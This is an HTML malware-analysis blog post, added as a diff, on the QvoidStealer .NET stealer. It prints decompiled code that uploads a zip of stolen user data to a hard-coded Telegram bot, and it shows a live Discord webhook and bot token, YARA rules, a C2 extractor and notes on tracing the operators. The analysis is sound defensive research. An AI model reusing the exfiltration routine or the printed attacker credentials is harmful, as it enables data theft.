@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="twitter:card" content="summary_large_image" /><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>QvoidStealer | OALABS Research</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="QvoidStealer" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Lol what is up with these trash .NET stealers" />
+<meta property="og:description" content="Lol what is up with these trash .NET stealers" />
+<link rel="canonical" href="https://research.openanalysis.net/qvoidstealer/yara/dotnet/stealer/2023/03/12/qvoid-stealer.html" />
+<meta property="og:url" content="https://research.openanalysis.net/qvoidstealer/yara/dotnet/stealer/2023/03/12/qvoid-stealer.html" />
+<meta property="og:site_name" content="OALABS Research" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-12T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="QvoidStealer" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-12T00:00:00-06:00","datePublished":"2023-03-12T00:00:00-06:00","description":"Lol what is up with these trash .NET stealers","headline":"QvoidStealer","mainEntityOfPage":{"@type":"WebPage","@id":"https://research.openanalysis.net/qvoidstealer/yara/dotnet/stealer/2023/03/12/qvoid-stealer.html"},"url":"https://research.openanalysis.net/qvoidstealer/yara/dotnet/stealer/2023/03/12/qvoid-stealer.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://research.openanalysis.net/feed.xml" title="OALABS Research" /><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Primer/15.2.0/primer.css" integrity="sha512-xTz2ys4coGAOz8vuV1NcQBkgVmKhsSEtjbqyMJbBHRplFuvKIUo6xhLHpAyPt9mfR6twHJgn9OgVLuqOvjeBhg==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
+
+<script>
+function wrap_img(fn) {
+    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
+        var elements = document.querySelectorAll(".post img");
+        Array.prototype.forEach.call(elements, function(el, i) {
+            if (el.getAttribute("title") && (el.className != "emoji")) {
+                const caption = document.createElement('figcaption');
+                var node = document.createTextNode(el.getAttribute("title"));
+                caption.appendChild(node);
+                const wrapper = document.createElement('figure');
+                wrapper.className = 'image';
+                el.parentNode.insertBefore(wrapper, el);
+                el.parentNode.removeChild(el);
+                wrapper.appendChild(el);
+                wrapper.appendChild(caption);
+            }
+        });
+    } else { document.addEventListener('DOMContentLoaded', fn); }
+}
+window.onload = wrap_img;
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function(){
+    // add link icon to anchor tags
+    var elem = document.querySelectorAll(".anchor-link")
+    elem.forEach(e => (e.innerHTML = '<i class="fas fa-link fa-xs"></i>'));
+    });
+</script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">OALABS Research</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/search/">Search</a><a class="page-link" href="/categories/">Tags</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">QvoidStealer</h1><p class="page-description">Lol what is up with these trash .NET stealers</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2023-03-12T00:00:00-06:00" itemprop="datePublished">
+        Mar 12, 2023
+      </time>
+       • <span class="read-time" title="Estimated read time">
+    
+    
+      3 min read
+    
+</span></p>
+
+    
+      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
+      
+        <a class="category-tags-link" href="/categories/#QvoidStealer">QvoidStealer</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#yara">yara</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#dotnet">dotnet</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#stealer">stealer</a>
+        
+      
+      </p>
+    
+
+    
+      
+        <div class="pb-5 d-flex flex-justify-left">
+            <div class="px-2">
+                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
+                </a>
+            </div>
+          <div class="px-2">
+
+    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2023-03-12-qvoid-stealer.ipynb" role="button" target="_blank">
+<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
+    </a>
+</div>
+
+          
+          
+          
+        </div>
+      </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h2"><a href="#Overview">Overview </a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#Samples">Samples </a></li>
+<li class="toc-entry toc-h3"><a href="#References">References </a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#Analysis">Analysis </a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#Yara-Rules">Yara Rules </a></li>
+<li class="toc-entry toc-h3"><a href="#Config-Extractor">Config Extractor </a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#Notes">Notes </a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#Discord-De-Anonymization">Discord De-Anonymization </a></li>
+<li class="toc-entry toc-h4"><a href="#Telegram-De-Anonymization">Telegram De-Anonymization </a></li>
+</ul>
+</li>
+</ul><!--
+#################################################
+### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
+#################################################
+# file to edit: _notebooks/2023-03-12-qvoid-stealer.ipynb
+-->
+
+<div class="container" id="notebook-container">
+        
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Overview">
+<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
+</h2>
+<p>This is an <a href="https://github.com/Enum0x539/Qvoid-Token-Grabber">open source</a> stealer (lol) that is being dropped along side Redline. We are going to take a quick look and build some yara rules and maybe a config extractor.</p>
+<h3 id="Samples">
+<a class="anchor" href="#Samples" aria-hidden="true"><span class="octicon octicon-link"></span></a>Samples<a class="anchor-link" href="#Samples"> </a>
+</h3>
+<ul>
+<li>
+<code>ef7bb2464a2b430aa98bd65a1a40b851b57cb909ac0aea3e53729c0ff900fa42</code> <a href="https://www.unpac.me/results/3a8fd069-3510-46f6-bb7b-00f36479a73c#/">UnpacMe Analysis</a>
+</li>
+</ul>
+<h3 id="References">
+<a class="anchor" href="#References" aria-hidden="true"><span class="octicon octicon-link"></span></a>References<a class="anchor-link" href="#References"> </a>
+</h3>
+<ul>
+<li><a href="https://github.com/Enum0x539/Qvoid-Token-Grabber">GitHub Source</a></li>
+</ul>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Analysis">
+<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
+</h2>
+<p>There is no config the config values are hard coded into the malware in the <code>Settings</code> class.</p>
+<div class="highlight"><pre><span></span><span class="c1">// Token: 0x0400005B RID: 91</span>
+<span class="k">public</span> <span class="k">static</span> <span class="n">DiscordWebhook</span> <span class="n">Webhook</span> <span class="p">=</span> <span class="k">new</span> <span class="n">DiscordWebhook</span><span class="p">(</span><span class="s">"https://discord.com/api/webhooks/1018147363531014255/uKi-k3i3zSVEkAUaQlsmJRCYATrY2kAsY06YGJ38v8lpW7BvMV3LdjJR8N1F18izeOoL"</span><span class="p">);</span>
+
+<span class="c1">// Token: 0x0400005C RID: 92</span>
+<span class="k">public</span> <span class="k">static</span> <span class="n">TelegramAPI</span> <span class="n">Telegram</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TelegramAPI</span><span class="p">(</span><span class="s">"%TELEGRAM_TOKEN_HERE%"</span><span class="p">,</span> <span class="m">0</span><span class="n">UL</span><span class="p">);</span>
+
+<span class="c1">// Token: 0x0400005D RID: 93</span>
+<span class="k">public</span> <span class="k">static</span> <span class="n">CryptoClipper</span> <span class="n">Clipper</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CryptoClipper</span><span class="p">(</span><span class="s">"BTC_ADDRESS_HERE_"</span><span class="p">,</span> <span class="s">"ETH_ADDRESS_HERE_"</span><span class="p">,</span> <span class="s">"DODGE_ADDRESS_HERE_"</span><span class="p">,</span> <span class="s">"LTC_ADDRESS_HERE_"</span><span class="p">,</span> <span class="s">"XMR_ADDRESS_HERE_"</span><span class="p">,</span> <span class="s">"DASH_ADDRESS_HERE_"</span><span class="p">,</span> <span class="s">"NEO_ADDRESS_HERE_"</span><span class="p">,</span> <span class="s">"XRP_ADDRESS_HERE_"</span><span class="p">);</span>
+</pre></div>
+<p>In addition to the "settings" there is also a hard coded telegram link in the <code>Grabber</code> class, used to upload a zip of the stolen info.</p>
+<div class="highlight"><pre><span></span><span class="p">{</span>
+<span class="n">MultipartFormDataContent</span> <span class="n">multipartFormDataContent</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MultipartFormDataContent</span><span class="p">();</span>
+<span class="kt">byte</span><span class="p">[]</span> <span class="n">array3</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="n">text11</span><span class="p">);</span>
+<span class="n">multipartFormDataContent</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="k">new</span> <span class="n">ByteArrayContent</span><span class="p">(</span><span class="n">array3</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array3</span><span class="p">.</span><span class="n">Length</span><span class="p">),</span> <span class="s">"Document"</span><span class="p">.</span><span class="n">ToLower</span><span class="p">(),</span> <span class="n">Environment</span><span class="p">.</span><span class="n">UserName</span> <span class="p">+</span> <span class="s">"-REPORT.zip"</span><span class="p">);</span>
+<span class="n">httpClient</span><span class="p">.</span><span class="n">PostAsync</span><span class="p">(</span><span class="s">"https://api.telegram.org/bot5782836382:AAHNuZVXqfrDOZvUuZDvx1SNqBnGmTN8Kio/sendDocument?chat_id=2024893777"</span><span class="p">,</span> <span class="n">multipartFormDataContent</span><span class="p">).</span><span class="n">Wait</span><span class="p">();</span>
+<span class="n">httpClient</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></div>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Yara-Rules">
+<a class="anchor" href="#Yara-Rules" aria-hidden="true"><span class="octicon octicon-link"></span></a>Yara Rules<a class="anchor-link" href="#Yara-Rules"> </a>
+</h3>
+<p><a href="https://twitter.com/dr4k0nia">@dr4k0nia</a> sent us this rule that will match on the silly anti-dumping features of the malware. She also poste this to <a href="https://github.com/dr4k0nia/yara-rules/blob/main/dotnet/msil_susp_obf_antidump.yar">GitHub</a>.</p>
+<div class="highlight"><pre><span></span><span class="n">import</span> <span class="s">"dotnet"</span>
+
+<span class="n">rule</span> <span class="n">msil_obf_antidump</span> <span class="p">{</span>
+    <span class="nl">meta</span><span class="p">:</span>
+        <span class="n">author</span> <span class="o">=</span> <span class="s">"dr4k0nia"</span>
+        <span class="n">version</span> <span class="o">=</span> <span class="s">"1.0"</span>
+        <span class="n">date</span> <span class="o">=</span> <span class="s">"12/03/2023"</span>
+        <span class="n">hash</span> <span class="o">=</span> <span class="s">"ef7bb2464a2b430aa98bd65a1a40b851b57cb909ac0aea3e53729c0ff900fa42"</span>
+    <span class="nl">strings</span><span class="p">:</span>
+        <span class="n">$import0</span> <span class="o">=</span> <span class="s">"ZeroMemory"</span>
+        <span class="n">$import1</span> <span class="o">=</span> <span class="s">"VirtualProtect"</span>
+        <span class="n">$importt2</span> <span class="o">=</span> <span class="s">"GetCurrentProcess"</span> <span class="c1">// Managed import</span>
+
+        <span class="n">$array0</span> <span class="o">=</span> <span class="p">{</span><span class="mi">1</span><span class="n">D</span> <span class="mi">8</span><span class="n">D</span> <span class="mi">9</span><span class="n">E</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">01</span> <span class="mi">25</span> <span class="n">D0</span> <span class="mi">67</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">04</span> <span class="mi">28</span> <span class="n">CF</span> <span class="mo">01</span> <span class="mo">00</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">80</span> <span class="mi">84</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">04</span><span class="p">}</span>
+        <span class="n">$array1</span> <span class="o">=</span> <span class="p">{</span><span class="mf">1F</span> <span class="mi">0</span><span class="n">C</span> <span class="mi">8</span><span class="n">D</span> <span class="mi">9</span><span class="n">E</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">01</span> <span class="mi">25</span> <span class="n">D0</span> <span class="mi">65</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">04</span> <span class="mi">28</span> <span class="n">CF</span> <span class="mo">01</span> <span class="mo">00</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">80</span> <span class="mi">86</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">04</span><span class="p">}</span>
+        <span class="n">$array2</span> <span class="o">=</span> <span class="p">{</span><span class="mf">1F</span> <span class="mi">1</span><span class="n">B</span> <span class="mi">8</span><span class="n">D</span> <span class="mi">9</span><span class="n">E</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">01</span> <span class="mi">25</span> <span class="n">D0</span> <span class="mi">66</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">04</span> <span class="mi">28</span> <span class="n">CF</span> <span class="mo">01</span> <span class="mo">00</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">80</span> <span class="mi">87</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">04</span><span class="p">}</span>
+    <span class="nl">condition</span><span class="p">:</span>
+        <span class="n">uint16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x5a4d</span>
+        <span class="n">and</span> <span class="n">dotnet</span><span class="p">.</span><span class="n">is_dotnet</span>
+        <span class="n">and</span> <span class="n">all</span> <span class="n">of</span><span class="p">(</span><span class="n">$import</span><span class="o">*</span><span class="p">)</span>
+        <span class="n">and</span> <span class="n">all</span> <span class="n">of</span><span class="p">(</span><span class="n">$array</span><span class="o">*</span><span class="p">)</span>
+<span class="p">}</span>
+</pre></div>
+<p>We also created this lame strings based rule</p>
+<div class="highlight"><pre><span></span><span class="n">import</span> <span class="s">"dotnet"</span>
+
+<span class="n">rule</span> <span class="n">qvoidstealer</span> <span class="p">{</span>
+    <span class="nl">strings</span><span class="p">:</span>
+        <span class="n">$s1</span> <span class="o">=</span> <span class="s">"Some retard who thinks he can reverse this application."</span> <span class="n">ascii</span> <span class="n">wide</span>
+        <span class="n">$s2</span> <span class="o">=</span> <span class="s">"QvoidStealer"</span> <span class="n">wide</span>
+        <span class="n">$m1</span> <span class="o">=</span> <span class="s">"AntiDebug"</span> <span class="n">wide</span>
+        <span class="n">$m2</span> <span class="o">=</span> <span class="s">"AntiEmulation"</span> <span class="n">wide</span>
+        <span class="n">$m3</span> <span class="o">=</span> <span class="s">"AntiSandBoxie"</span> <span class="n">wide</span>
+        <span class="n">$m4</span> <span class="o">=</span> <span class="s">"AntiVM"</span> <span class="n">wide</span>
+        <span class="n">$m5</span> <span class="o">=</span> <span class="s">"AntiWebSniffers"</span> <span class="n">wide</span>
+        <span class="n">$m6</span> <span class="o">=</span> <span class="s">"Clipper"</span> <span class="n">wide</span>
+        <span class="n">$m7</span> <span class="o">=</span> <span class="s">"Webhook"</span> <span class="n">wide</span>
+    <span class="nl">condition</span><span class="p">:</span>
+        <span class="n">uint16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x5a4d</span> <span class="n">and</span>
+        <span class="n">dotnet</span><span class="p">.</span><span class="n">is_dotnet</span> <span class="n">and</span> 
+        <span class="p">(</span>   
+            <span class="mi">1</span> <span class="n">of</span> <span class="p">(</span><span class="n">$s</span><span class="o">*</span><span class="p">)</span> <span class="n">or</span> 
+            <span class="n">all</span> <span class="n">of</span> <span class="p">(</span><span class="n">$m</span><span class="o">*</span><span class="p">)</span>
+        <span class="p">)</span>
+
+<span class="p">}</span>
+</pre></div>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Config-Extractor">
+<a class="anchor" href="#Config-Extractor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Config Extractor<a class="anchor-link" href="#Config-Extractor"> </a>
+</h3>
+<p>(don't judge me!)</p>
+
+</div>
+</div>
+</div>
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/what.bin'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+    
+
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="k">def</span> <span class="nf">unicode_strings</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
+    <span class="kn">import</span> <span class="nn">re</span>
+    <span class="n">ASCII_BYTE</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">' !</span><span class="se">\"</span><span class="s1">#\$%&amp;</span><span class="se">\'</span><span class="s1">\(\)\*\+,-\./0123456789:;&lt;=&gt;\?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}</span><span class="se">\\</span><span class="s1">\~</span><span class="se">\t</span><span class="s1">'</span>
+    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span><span class="p">:</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
+    <span class="n">reg</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'((?:[</span><span class="si">%s</span><span class="s1">]</span><span class="se">\x00</span><span class="s1">){</span><span class="si">%d</span><span class="s1">,})'</span> <span class="o">%</span> <span class="p">(</span><span class="n">ASCII_BYTE</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+    <span class="n">uni_re</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">match</span> <span class="ow">in</span> <span class="n">uni_re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"utf-16"</span><span class="p">))</span>
+        <span class="k">except</span> <span class="ne">UnicodeDecodeError</span><span class="p">:</span>
+            <span class="k">pass</span>
+    <span class="k">return</span> <span class="n">out</span>
+
+<span class="n">strings</span> <span class="o">=</span> <span class="n">unicode_strings</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+    
+
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">telegram_egg</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'https:\/\/api\.telegram\.org[^\?]*\?chat_id=[0-9]+'</span>
+<span class="n">discord_egg</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'https:\/\/discord\.com\/api\/webhooks\/[^\n]*'</span>
+
+<span class="n">c2s</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">telegram_egg</span><span class="p">,</span> <span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">strings</span><span class="p">),</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">):</span>
+    <span class="n">c2s</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>
+
+<span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">discord_egg</span><span class="p">,</span> <span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">strings</span><span class="p">),</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">):</span>
+    <span class="n">c2s</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>
+
+<span class="n">c2s</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+<div class="output_wrapper">
+<div class="output">
+
+<div class="output_area">
+
+
+
+<div class="output_text output_subarea output_execute_result">
+<pre>['https://api.telegram.org/bot5782836382:AAHNuZVXqfrDOZvUuZDvx1SNqBnGmTN8Kio/sendDocument?chat_id=2024893777',
+ 'https://discord.com/api/webhooks/1018147363531014255/uKi-k3i3zSVEkAUaQlsmJRCYATrY2kAsY06YGJ38v8lpW7BvMV3LdjJR8N1F18izeOoL']</pre>
+</div>
+
+</div>
+
+</div>
+</div>
+
+</div>
+    
+
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Notes">
+<a class="anchor" href="#Notes" aria-hidden="true"><span class="octicon octicon-link"></span></a>Notes<a class="anchor-link" href="#Notes"> </a>
+</h2>
+<h4 id="Discord-De-Anonymization">
+<a class="anchor" href="#Discord-De-Anonymization" aria-hidden="true"><span class="octicon octicon-link"></span></a>Discord De-Anonymization<a class="anchor-link" href="#Discord-De-Anonymization"> </a>
+</h4>
+<p>Can we determin the discord server based on the the webhook?</p>
+<p><code>https://discord.com/api/webhooks/1018147363531014255/uKi-k3i3zSVEkAUaQlsmJRCYATrY2kAsY06YGJ38v8lpW7BvMV3LdjJR8N1F18izeOoL</code></p>
+<p>If we call the webhook the response is ....</p>
+
+<pre><code>{
+"type": 1, 
+"id": "1018147363531014255", 
+"name": "Clown", 
+"avatar": null, 
+"channel_id": "1018147299177807935", 
+"guild_id": "1018147298502516836", 
+"application_id": null, 
+"token": "uKi-k3i3zSVEkAUaQlsmJRCYATrY2kAsY06YGJ38v8lpW7BvMV3LdjJR8N1F18izeOoL"
+}</code></pre>
+<p>This site looks promising <a href="https://discordlookup.com/guild/1018147298502516836">discordlookup</a> but it didn't return anything.</p>
+<p>We can also interrogate the snowflake using <a href="https://toolscord.com/snowflake">toolscord</a></p>
+
+<pre><code>Server Created: Saturday, September 10, 2022 at 9:13:52 AM EDT</code></pre>
+<p>Thomas also found this interesting endpoint to query <code>https://discord.com/api/v9/users/@me/guilds/1018147298502516836/settings</code></p>
+
+<pre><code>{
+    "guild_id": "1018147298502516836",
+    "suppress_everyone": false,
+    "suppress_roles": false,
+    "mute_scheduled_events": false,
+    "message_notifications": 0,
+    "flags": 0,
+    "mobile_push": true,
+    "muted": false,
+    "mute_config": null,
+    "hide_muted_channels": false,
+    "channel_overrides": [
+        {
+            "channel_id": "885624530071085097",
+            "message_notifications": 3,
+            "muted": true,
+            "mute_config": {
+                "end_time": null,
+                "selected_time_window": -1
+            },
+            "collapsed": false
+        }
+    ],
+    "notify_highlights": 0,
+    "version": 3642
+}</code></pre>
+<h4 id="Telegram-De-Anonymization">
+<a class="anchor" href="#Telegram-De-Anonymization" aria-hidden="true"><span class="octicon octicon-link"></span></a>Telegram De-Anonymization<a class="anchor-link" href="#Telegram-De-Anonymization"> </a>
+</h4>
+<p>What about getting the telegram channel from the bot chat id?</p>
+
+<pre><code>https://api.telegram.org/bot5782836382:AAHNuZVXqfrDOZvUuZDvx1SNqBnGmTN8Kio/sendDocument?chat_id=2024893777</code></pre>
+<p>We can try the getMe command to get more info but the bot seems to be dead.</p>
+
+<pre><code>https://api.telegram.org/bot5782836382:AAHNuZVXqfrDOZvUuZDvx1SNqBnGmTN8Kio/getMe</code></pre>
+
+</div>
+</div>
+</div>
+</div>
+
+
+
+  </div><a class="u-url" href="/qvoidstealer/yara/dotnet/stealer/2023/03/12/qvoid-stealer.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
